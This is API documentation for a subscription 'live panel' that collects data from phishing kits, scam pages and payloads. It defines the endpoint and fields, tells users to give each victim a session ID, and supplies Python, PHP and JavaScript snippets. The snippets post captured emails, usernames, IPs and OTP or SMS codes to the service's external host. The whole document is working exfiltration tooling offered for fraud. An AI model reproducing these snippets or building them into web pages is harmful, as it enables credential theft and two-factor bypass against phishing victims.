# 📥 Adding Data to Live Panel

Once your subscription hash is verified and active, you can start sending captured data from your phishing kits, scam pages, or payloads directly to the **SpamTools Live Panel**.

---

## ✅ Endpoint

```
POST https://spamtools.org/wp-json/spamtools/v1/add-subscription-data
```

---

## 🧾 Required Fields

| Field         | Type     | Required | Description                                  |
|--------------|----------|----------|----------------------------------------------|
| `hash`        | string   | ✅       | Your valid subscription hash                 |
| `user_session`| string   | ✅       | Unique session ID per victim/session         |
| `data1`       | string   | ❌       | Any captured info (e.g., name, email, etc.)  |
| `data2`       | string   | ❌       | Any captured info (e.g., browser, OS)        |
| `data3`       | string   | ❌       | Any captured info (e.g., IP, location)       |
| `data4`       | string   | ❌       | Any extra log info or custom payload         |

> 🧠 `user_session` is used to group multiple logs together. If the same `user_session` is reused, data is **appended** to existing logs instead of creating a new row.

---

## 📦 Example Payload

```json
{
  "hash": "abc123hashvalue",
  "user_session": "9c7a3edb-2f2f-11ee-be56-0242ac120002",
  "data1": "Email: user@example.com",
  "data2": "Browser: Chrome",
  "data3": "IP: 192.168.1.2",
  "data4": "OTP: 823190"
}
```

---

## ✅ Example Response (Success)

```json
{
  "success": "Data added successfully."
}
```

---

## ❌ Possible Error Responses

### Missing required fields:

```json
{
  "error": "Hash and User Session are required."
}
```

### Invalid or expired hash:

```json
{
  "error": "Invalid hash."
}
```

```json
{
  "error": "Hash is expired."
}
```

### Update failure:

```json
{
  "error": "Failed to update data."
}
```

### Insert failure:

```json
{
  "error": "Failed to insert data."
}
```

---

## 💻 Code Snippets

### 🐍 Python (Minimal Example)

```python
import requests

payload = {
    "hash": "your_subscription_hash",
    "user_session": "session-uuid-or-id",
    "data1": "Email: victim@example.com",
    "data2": "Browser: Firefox",
    "data3": "IP: 192.168.0.1",
    "data4": "Captured OTP: 372829"
}

res = requests.post("https://spamtools.org/wp-json/spamtools/v1/add-subscription-data", json=payload)

print(res.status_code, res.json())
```

---

### 🐘 PHP (cURL)

```php
<?php
$payload = json_encode([
    "hash" => "your_subscription_hash",
    "user_session" => "unique-session-id",
    "data1" => "Email: test@example.com",
    "data2" => "Device: Android",
    "data3" => "IP: 192.0.2.1",
    "data4" => "SMS Code: 999111"
]);

$ch = curl_init("https://spamtools.org/wp-json/spamtools/v1/add-subscription-data");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);

$response = curl_exec($ch);
curl_close($ch);

echo $response;
?>
```

---

### 🌐 JavaScript (Browser/Node)

```js
fetch("https://spamtools.org/wp-json/spamtools/v1/add-subscription-data", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    hash: "your_subscription_hash",
    user_session: "session-id",
    data1: "Username: test",
    data2: "Browser: Chrome",
    data3: "IP: 203.0.113.1",
    data4: "OTP: 129384"
  })
})
  .then(res => res.json())
  .then(data => console.log(data))
  .catch(err => console.error("Error:", err));
```

---

## 📌 Notes

- Each kit/logger/page should generate a **unique session ID per victim** to avoid overwriting logs.
- You can reuse the same `user_session` to **append logs progressively**.
- Make sure your subscription hash is valid before using this endpoint.

---

